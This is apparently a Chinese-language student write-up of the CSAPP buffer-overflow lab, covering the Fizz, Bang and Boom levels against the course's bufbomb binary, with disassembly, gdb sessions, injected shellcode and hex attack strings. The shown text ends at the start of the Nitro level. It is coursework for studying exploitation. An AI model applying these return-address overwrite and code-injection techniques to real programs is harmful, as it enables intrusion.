+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">08048be8 &lt;fizz&gt;:</span><br><span class="line"> 8048be8:	55                   	push   %ebp</span><br><span class="line"> 8048be9:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 8048beb:	83 ec 08             	sub    $0x8,%esp</span><br><span class="line"> 8048bee:	8b 55 08             	mov    0x8(%ebp),%edx</span><br><span class="line"> 8048bf1:	a1 58 e1 04 08       	mov    0x804e158,%eax</span><br><span class="line"> 8048bf6:	39 c2                	cmp    %eax,%edx</span><br><span class="line"> 8048bf8:	75 22                	jne    8048c1c &lt;fizz+0x34&gt;</span><br><span class="line"> 8048bfa:	83 ec 08             	sub    $0x8,%esp</span><br><span class="line"> 8048bfd:	ff 75 08             	pushl  0x8(%ebp)</span><br><span class="line"> 8048c00:	68 db a4 04 08       	push   $0x804a4db</span><br><span class="line"> 8048c05:	e8 76 fc ff ff       	call   8048880 &lt;printf@plt&gt;</span><br><span class="line"> 8048c0a:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8048c0d:	83 ec 0c             	sub    $0xc,%esp</span><br><span class="line"> 8048c10:	6a 01                	push   $0x1</span><br><span class="line"> 8048c12:	e8 b4 08 00 00       	call   80494cb &lt;validate&gt;</span><br><span class="line"> 8048c17:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8048c1a:	eb 13                	jmp    8048c2f &lt;fizz+0x47&gt;</span><br><span class="line"> 8048c1c:	83 ec 08             	sub    $0x8,%esp</span><br><span class="line"> 8048c1f:	ff 75 08             	pushl  0x8(%ebp)</span><br><span class="line"> 8048c22:	68 fc a4 04 08       	push   $0x804a4fc</span><br><span class="line"> 8048c27:	e8 54 fc ff ff       	call   8048880 &lt;printf@plt&gt;</span><br><span class="line"> 8048c2c:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8048c2f:	83 ec 0c             	sub    $0xc,%esp</span><br><span class="line"> 8048c32:	6a 00                	push   $0x0</span><br><span class="line"> 8048c34:	e8 37 fd ff ff       	call   8048970 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure>
+<p>​    老规矩，我们先从getbuf开始讲起，和smoke相似的是，我们都要将缓冲区溢出，在溢出之后，我们通过改变函数的返回地址，从而使得函数进入fizz函数，但是根据fizz函数的汇编代码，我们可以看到，我们需要将我们的cookie的值作为参数导入到函数中，那也就是说我们应该同时修改函数参数区的值，根据栈结构理解一下，栈结构如图所示：</p>
+<p>​    <img src="/CSAPP-AttackLab-哈工大版-bufflab/image-20181122011656564.png" alt="image-20181122011656564"></p>
+<p>根据fizz的代码我们可以看出，其实是取了ebp+0x8地址上的参数进行比较，所以我们在构造字符串的时候，也就是我们要把ebp+0x8的位置的值写成我们的cookie值。而当函数返回的时候，ebp会指向返回地址处，所以我们将ebp+0x8处存入cookie即可。</p>
+<p>​    所以我们构建出了如下的字符串：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">一开始申请的40字节</span><br><span class="line">00 00 00 00</span><br><span class="line">test（）的ebp值</span><br><span class="line">e8 8b 04 08</span><br><span class="line">fizz的地址/ebp值</span><br><span class="line">00 00 00 00</span><br><span class="line">c9 a3 6f 67</span><br><span class="line">cookie值</span><br></pre></td></tr></table></figure>
+<p>综上所示，我们就构建出了目标字符串，将目标字符串进行运行，就会显示出结果：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ubuntu/home/zinker/lab4/buflab-handout-<span class="number">32</span>-O0 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - <span class="number">18</span>-<span class="number">11</span>-<span class="number">21</span> <span class="number">23</span>:<span class="number">58</span></span><br><span class="line">zinker &gt;&gt;&gt; cat fizz_in.txt | ./hex2raw -n | ./bufbomb  -u <span class="number">1170300532</span></span><br><span class="line">Userid: <span class="number">1170300532</span></span><br><span class="line">Cookie: <span class="number">0</span>x676fa3c9</span><br><span class="line">Type string:Fizz!: You called fizz(<span class="number">0</span>x676fa3c9)</span><br><span class="line">VALID</span><br><span class="line">NICE JOB!</span><br></pre></td></tr></table></figure>
+<h1 id="Bang"><a href="#Bang" class="headerlink" title="Bang"></a>Bang</h1><p>​    从这个实验开始，我们真正进入了这次实验最重要的地方，也就是我们需要自己写汇编代码。好的，我们依旧从Bang函数的C语言源码开始：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> global_value = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bang</span><span class="params">(<span class="keyword">int</span> val)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(global_value == cookie)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Bang!: You set global_value to 0x%x\n"</span>, global_value);</span><br><span class="line">        validate(<span class="number">2</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Misfire: global_value = 0x%x\n"</span>, global_value);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>​    好的，根据ppt中的提示信息，我们需要构造攻击字符串，使得目标程序调用bang函数，要将全局变量中global_value的值篡改为cookie值，使相应的判断成功。我们需要在缓冲区中注入代码来改变这个全局变量。</p>
+<p>​    那么我们依旧从bang函数的汇编代码开始：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">08048c39 &lt;bang&gt;:</span><br><span class="line"> 8048c39:	55                   	push   %ebp</span><br><span class="line"> 8048c3a:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 8048c3c:	83 ec 08             	sub    $0x8,%esp</span><br><span class="line"> 8048c3f:	a1 60 e1 04 08       	mov    0x804e160,%eax</span><br><span class="line"> 8048c44:	89 c2                	mov    %eax,%edx</span><br><span class="line"> 8048c46:	a1 58 e1 04 08       	mov    0x804e158,%eax</span><br><span class="line"> 8048c4b:	39 c2                	cmp    %eax,%edx</span><br><span class="line"> 8048c4d:	75 25                	jne    8048c74 &lt;bang+0x3b&gt;</span><br><span class="line"> 8048c4f:	a1 60 e1 04 08       	mov    0x804e160,%eax</span><br><span class="line"> 8048c54:	83 ec 08             	sub    $0x8,%esp</span><br><span class="line"> 8048c57:	50                   	push   %eax</span><br><span class="line"> 8048c58:	68 1c a5 04 08       	push   $0x804a51c</span><br><span class="line"> 8048c5d:	e8 1e fc ff ff       	call   8048880 &lt;printf@plt&gt;</span><br><span class="line"> 8048c62:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8048c65:	83 ec 0c             	sub    $0xc,%esp</span><br><span class="line"> 8048c68:	6a 02                	push   $0x2</span><br><span class="line"> 8048c6a:	e8 5c 08 00 00       	call   80494cb &lt;validate&gt;</span><br><span class="line"> 8048c6f:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8048c72:	eb 16                	jmp    8048c8a &lt;bang+0x51&gt;</span><br><span class="line"> 8048c74:	a1 60 e1 04 08       	mov    0x804e160,%eax</span><br><span class="line"> 8048c79:	83 ec 08             	sub    $0x8,%esp</span><br><span class="line"> 8048c7c:	50                   	push   %eax</span><br><span class="line"> 8048c7d:	68 41 a5 04 08       	push   $0x804a541</span><br><span class="line"> 8048c82:	e8 f9 fb ff ff       	call   8048880 &lt;printf@plt&gt;</span><br><span class="line"> 8048c87:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8048c8a:	83 ec 0c             	sub    $0xc,%esp</span><br><span class="line"> 8048c8d:	6a 00                	push   $0x0</span><br><span class="line"> 8048c8f:	e8 dc fc ff ff       	call   8048970 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure>
+<p>首先我们的目的很简单，就是找到全局变量global_value的地址。那么我们需要利用到一部分的gdb或者cgdb，首先，使用如下的语句：​    </p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">(gdb) file bufbomb</span><br><span class="line">Reading symbols from bufbomb...(no debugging symbols found)...done.</span><br><span class="line">(gdb) b test</span><br><span class="line">Breakpoint <span class="number">1</span> at <span class="number">0</span>x8048c9a</span><br><span class="line">(gdb) r -u <span class="number">1170300532</span></span><br><span class="line">Starting program: /home/zinker/lab4/buflab-handout-<span class="number">32</span>-O0/bufbomb -u <span class="number">1170300532</span></span><br><span class="line">Userid: <span class="number">1170300532</span></span><br><span class="line">Cookie: <span class="number">0</span>x676fa3c9</span><br><span class="line"></span><br><span class="line">Breakpoint <span class="number">1</span>, <span class="number">0</span>x08048c9a <span class="keyword">in</span> test ()</span><br><span class="line">(gdb) x/s <span class="number">0</span>x804e160</span><br><span class="line"><span class="number">0</span>x804e160 &lt;global_value&gt;:       <span class="string">""</span>//忽略这个值</span><br><span class="line">(gdb) x/s <span class="number">0</span>x804e158</span><br><span class="line"><span class="number">0</span>x804e158 &lt;cookie&gt;:     <span class="string">"M-IM-#og"</span>//这个值也忽略</span><br></pre></td></tr></table></figure>
+<p>​    我们通过观察bang的汇编代码，会发现bang能够输出我们的cookie的条件取决于cmp的语句，而这个cmp所比较的两个位置经过对前面汇编代码的翻译，我们可以确定是对0x804e160、0x804e158进行比较，也就是说我们需要从这两个位置中确定哪一个是global_value，根据上面在gdb中的调试我们能够确定0x804e160就是我们要找的global_value的地址。</p>
+<p>​    接下来的步骤是这个实验的关键部分，也是在之后的Boom和Nitro中也要使用的环节，自己书写汇编代码。当然，在写代码之前我们必须确定我们的目的是什么，我们是要改变全局变量的值，然后让getbuf这个函数运行bang函数。那么首先我们能够确定的部分是：我们要写什么样的代码。</p>
+<p>​    我们已知的代码片段是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov $0x676fa3c9, 0x804e160</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+<p>​    也就是说，我们一定会写出这样的代码，那么问题来了，我们怎么才能调用bang函数呢？有的人可能会想，我们要在函数返回地址处写上bang函数的地址，那样的话就可以调用bang函数，但是这种方法是有问题的，因为它并没有改变全局变量的值，也就是我们写的汇编语句并没有发挥作用。所以我们不能直接在函数返回地址处写bang的地址。这时候，我们就要依靠栈结构去达到我们的目的，也就是利用push语句，去直接转到bang函数。这种方法的基础在于，我们在使用push语句的时候，将地址入栈后ret，就可以立刻进入我们刚刚放到栈中的地址，所以我们最终的汇编代码应该如下所示：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov $0x676fa3c9, 0x804e160</span><br><span class="line">push $0x8048c39</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+<p>​    那么，我们应该怎么解决函数返回地址的问题呢？也就是说我们在字符串的返回地址区写点什么呢？首先我们要先找到我们栈顶的位置，</p>
+<p>​    利用gdb，我们找到</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">08049378</span> &lt;getbuf&gt;:</span><br><span class="line"> <span class="number">8049378</span>:	<span class="number">55</span>                   	push   %ebp</span><br><span class="line"> <span class="number">8049379</span>:	<span class="number">89</span> e5                	mov    %esp,%ebp</span><br><span class="line"> <span class="number">804937</span>b:	<span class="number">83</span> ec <span class="number">28</span>             	sub    <span class="variable">$0x28</span>,%esp</span><br><span class="line"> <span class="number">804937</span>e:	<span class="number">83</span> ec <span class="number">0</span>c             	sub    <span class="variable">$0xc</span>,%esp</span><br><span class="line"> <span class="number">8049381</span>:	<span class="number">8</span>d <span class="number">45</span> d8             	lea    -<span class="number">0</span>x28(%ebp),%eax</span><br><span class="line"> <span class="number">8049384</span>:	<span class="number">50</span>                   	push   %eax</span><br><span class="line"> ....</span><br></pre></td></tr></table></figure>
+<p>​    然后利用stepi命令，使程序运行到push，然后查询eax，就可以得到eax的地址，也就使我们栈帧顶的地址</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/x <span class="variable">$eax</span></span><br><span class="line"><span class="number">0</span>x556837a8 &lt;_reserved+<span class="number">1038248</span>&gt;: <span class="number">0</span>x556837d0 // 左边那个</span><br></pre></td></tr></table></figure>
+<p>​    这样我们就确定了我们的栈顶位置，为了简单起见，我们仅将恶意代码注入到栈顶的位置，而不对栈进行修改。紧接着我们开始对我们的恶意代码进行处理，利用如下的语句：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -c asm.s</span><br><span class="line">objdump -d asm.o</span><br></pre></td></tr></table></figure>
+<p>​    我们可以得到如下的显示：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ubuntu/home/zinker/lab4/buflab-handout-<span class="number">32</span>-O0  - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - <span class="number">18</span>-<span class="number">11</span>-<span class="number">22</span> <span class="number">2</span>:<span class="number">08</span></span><br><span class="line">zinker &gt;&gt;&gt; objdump -d asm.o                                                                                                                 <span class="number">1</span></span><br><span class="line"></span><br><span class="line">asm.o：     文件格式 elf32-i386</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line"><span class="number">00000000</span> &lt;.text&gt;:</span><br><span class="line">   <span class="number">0</span>:	c7 <span class="number">05</span> <span class="number">60</span> e1 <span class="number">04</span> <span class="number">08</span> c9 	movl   <span class="variable">$0x676fa3c9</span>,<span class="number">0</span>x804e160</span><br><span class="line">   <span class="number">7</span>:	a3 <span class="number">6</span>f <span class="number">67</span> </span><br><span class="line">   a:	<span class="number">68</span> <span class="number">39</span> <span class="number">8</span>c <span class="number">04</span> <span class="number">08</span>       	push   <span class="variable">$0x8048c39</span></span><br><span class="line">   f:	c3                   	ret</span><br></pre></td></tr></table></figure>
+<p>​    而我们需要的就是c7 05这些数字，根据以上的信息我们可以构建字符串了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">c7 05 60 e1 《-|</span><br><span class="line">04 08 c9 a3   |</span><br><span class="line">6f 67 68 39   |</span><br><span class="line">8c 04 08 c3   |</span><br><span class="line">汇编代码       |</span><br><span class="line">00 00 00 00   |</span><br><span class="line">00 00 00 00   |</span><br><span class="line">00 00 00 00   |</span><br><span class="line">00 00 00 00   |</span><br><span class="line">00 00 00 00   |</span><br><span class="line">00 00 00 00   |</span><br><span class="line">00 00 00 00   |</span><br><span class="line">a8 37 68 55   |</span><br><span class="line">栈顶位置--------</span><br></pre></td></tr></table></figure>
+<p>​    综上所述，我们构建出了字符串，然后进行运行，得到如下结果：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ubuntu/home/zinker/lab4/buflab-handout-<span class="number">32</span>-O0  - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - <span class="number">18</span>-<span class="number">11</span>-<span class="number">22</span> <span class="number">2</span>:<span class="number">08</span></span><br><span class="line">zinker &gt;&gt;&gt; cat bang_in.txt | ./hex2raw -n | ./bufbomb  -u <span class="number">1170300532</span></span><br><span class="line">Userid: <span class="number">1170300532</span></span><br><span class="line">Cookie: <span class="number">0</span>x676fa3c9</span><br><span class="line">Type string:Bang!: You set global_value to <span class="number">0</span>x676fa3c9</span><br><span class="line">VALID</span><br><span class="line">NICE JOB!</span><br></pre></td></tr></table></figure>
+<h1 id="Boom"><a href="#Boom" class="headerlink" title="Boom"></a>Boom</h1><p>​    加油我们马上就要到最后一个了！</p>
+<p>​    第四个实验，Boom。这个实验没有C的原代码，也就是说所有的操作都是在汇编的环境下进行的。这次的boom和前三个实验不同，前三次实验都是使目标程序跳转到特定函数，进而利用exit函数结束目标程序运行，攻击造成的栈帧结构破坏是可接受的。而boom要求被攻击程序能返回到test函数继续执行，也就是说所谓的无感攻击。我们的目的是构造攻击字符串，使得getbuf能返回cookie值到test函数，而不是1。</p>
+<p>​    首先，我们要知道，我们之前的时候都破坏了哪里的栈帧，简单的说，我们将ebp的值进行了强行覆盖，我们把所有的ebp都变成了00 00 00 00，而无感攻击要求不破坏栈帧结构，那么我们首先要确定ebp的值，所以我们使用gdb进行调试。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">(gdb) file bufbomb</span><br><span class="line">Reading symbols from bufbomb...(no debugging symbols found)...done.</span><br><span class="line">(gdb) b getbuf</span><br><span class="line">Breakpoint <span class="number">1</span> at <span class="number">0</span>x804937e</span><br><span class="line">(gdb) r -u <span class="number">1170300532</span></span><br><span class="line">Starting program: /home/zinker/lab4/buflab-handout-<span class="number">32</span>-O0/bufbomb -u <span class="number">1170300532</span></span><br><span class="line">Userid: <span class="number">1170300532</span></span><br><span class="line">Cookie: <span class="number">0</span>x676fa3c9</span><br><span class="line"></span><br><span class="line">Breakpoint <span class="number">1</span>, <span class="number">0</span>x0804937e <span class="keyword">in</span> getbuf ()</span><br><span class="line">(gdb) x/x <span class="variable">$ebp</span></span><br><span class="line"><span class="number">0</span>x556837d0 &lt;_reserved+<span class="number">1038288</span>&gt;: <span class="number">0</span>x556837f0</span><br></pre></td></tr></table></figure>
+<p>​    那么我们就可以确定ebp中存储的内容是0x556837f0，那么我们就确定了两个因素，一个是我们的返回地址，方法和Bang相同，还有一个就是这个ebp。好的接着我们考虑一下我们怎么去更改返回值。</p>
+<p>​    更改返回值的办法很简单，就是更改eax，因为在汇编语言中eax代表着函数的返回值。所以我们接下来要确定的就是我们在自己写的汇编代码ret之后要返回到什么地址。解决这个问题需要我们看test函数，因为顺序是test函数-&gt;getbuf函数，所以我们要先看test函数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">08048c94 &lt;test&gt;:</span><br><span class="line"> 8048c94:	55                   	push   %ebp</span><br><span class="line"> 8048c95:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 8048c97:	83 ec 18             	sub    $0x18,%esp</span><br><span class="line"> 8048c9a:	e8 64 04 00 00       	call   8049103 &lt;uniqueval&gt;</span><br><span class="line"> 8048c9f:	89 45 f0             	mov    %eax,-0x10(%ebp)</span><br><span class="line"> 8048ca2:	e8 d1 06 00 00       	call   8049378 &lt;getbuf&gt;</span><br><span class="line"> 8048ca7:	89 45 f4             	mov    %eax,-0xc(%ebp)</span><br><span class="line"> .....</span><br></pre></td></tr></table></figure>
+<p> 找到调用getbuf的位置，我们明白了，eax其实只是getbuf的返回值而已，所以我们的最终目标就是在运行getbuf的时候，通过缓冲区溢出，更改返回值为cookie，然后直接跳过getbuf的ret，直接执行0x8048ca7的语句内容，这样就成功修改了getbuf的返回值。所以我们的汇编代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov $0x676fa3c9, %eax</span><br><span class="line">push $0x8048ca7</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+<p>​    紧接着我们开始对我们的恶意代码进行处理，利用如下的语句：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -c asm2.s</span><br><span class="line">objdump -d asm2.o</span><br></pre></td></tr></table></figure>
+<p>​    我们就会看到下面的语句：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ubuntu/home/zinker/lab4/buflab-handout-<span class="number">32</span>-O0  - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - <span class="number">18</span>-<span class="number">11</span>-<span class="number">22</span> <span class="number">2</span>:<span class="number">58</span></span><br><span class="line">zinker &gt;&gt;&gt; gcc -m32 -c asm2.s                                       </span><br><span class="line">ubuntu/home/zinker/lab4/buflab-handout-<span class="number">32</span>-O0  - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - <span class="number">18</span>-<span class="number">11</span>-<span class="number">22</span> <span class="number">2</span>:<span class="number">59</span></span><br><span class="line">zinker &gt;&gt;&gt; objdump -d asm2.o</span><br><span class="line"></span><br><span class="line">asm2.o：     文件格式 elf32-i386</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line"><span class="number">00000000</span> &lt;.text&gt;:</span><br><span class="line">   <span class="number">0</span>:	b8 c9 a3 <span class="number">6</span>f <span class="number">67</span>       	mov    <span class="variable">$0x676fa3c9</span>,%eax</span><br><span class="line">   <span class="number">5</span>:	<span class="number">68</span> a7 <span class="number">8</span>c <span class="number">04</span> <span class="number">08</span>       	push   <span class="variable">$0x8048ca7</span></span><br><span class="line">   a:	c3                   	ret</span><br></pre></td></tr></table></figure>
+<p>然后我们就可以开始构造字符串了，构造的字符串如下所示：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">b8 c9 a3 6f </span><br><span class="line">67 68 a7 8c</span><br><span class="line">04 08 c3 00 //自己的汇编代码</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">f0 37 68 55	//正常的ebp值</span><br><span class="line">a8 37 68 55 //栈顶</span><br></pre></td></tr></table></figure>
+<p>运行之后，得到如下的结果：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ubuntu/home/zinker/lab4/buflab-handout-<span class="number">32</span>-O0  - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - <span class="number">18</span>-<span class="number">11</span>-<span class="number">22</span> <span class="number">2</span>:<span class="number">59</span></span><br><span class="line">zinker &gt;&gt;&gt; cat boom_in.txt | ./hex2raw -n | ./bufbomb  -u <span class="number">1170300532</span></span><br><span class="line">Userid: <span class="number">1170300532</span></span><br><span class="line">Cookie: <span class="number">0</span>x676fa3c9</span><br><span class="line">Type string:Boom!: getbuf returned <span class="number">0</span>x676fa3c9</span><br><span class="line">VALID</span><br><span class="line">NICE JOB!</span><br></pre></td></tr></table></figure>
+<p>终于，这基础的4个实验结束了，我们稍微总结一下，我们主要利用的是在缓冲区溢出之后，通过更改返回地址或者参数调用去影响正常的程序，如果希望你的修改能够不被发现，就要尽可能的保持原有的栈帧结构，还有就是汇编语言的书写。真的在这个时候，才觉得自己学的东西真少，应该学的东西太多了。</p>
+<h1 id="Nitro"><a href="#Nitro" class="headerlink" title="Nitro"></a>Nitro</h1><p>​    最后一个！！也是真正挑战开始的时刻，我们要使用-n指令来开启Nitro模式，这样我们才能进行nitro的破解，这次实验中我们所调用的函数将会变成getbufn和testn，区别在于getbufn是将栈帧的地址空间随机化，而getbuf是将栈帧地址固定于一个位置上，所以我们必须要想办法去在随机栈帧的情况下仍然能够达到我们的要求。</p>
+<p>​    那么我们要构造攻击字符串使得getbufn返回cookie给testn函数，同时恢复正确栈帧结构，正确返回到testn函数。值得注意的是，getbufn将会选取5个不同的栈帧地址，而我们要想办法使得每一次都能够正确复原栈帧，并使得程序返回到testn。</p>
+<p>​    那么我们首先先看一下getbufn和testn的汇编代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">08049394 &lt;getbufn&gt;:</span><br><span class="line"> 8049394:	55                   	push   %ebp</span><br><span class="line"> 8049395:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 8049397:	81 ec 08 02 00 00    	sub    $0x208,%esp</span><br><span class="line"> 804939d:	83 ec 0c             	sub    $0xc,%esp</span><br><span class="line"> 80493a0:	8d 85 f8 fd ff ff    	lea    -0x208(%ebp),%eax</span><br><span class="line"> 80493a6:	50                   	push   %eax</span><br><span class="line"> 80493a7:	e8 7c fa ff ff       	call   8048e28 &lt;Gets&gt;</span><br><span class="line"> 80493ac:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 80493af:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line"> 80493b4:	c9                   	leave  </span><br><span class="line"> 80493b5:	c3                   	ret</span><br></pre></td></tr></table></figure>
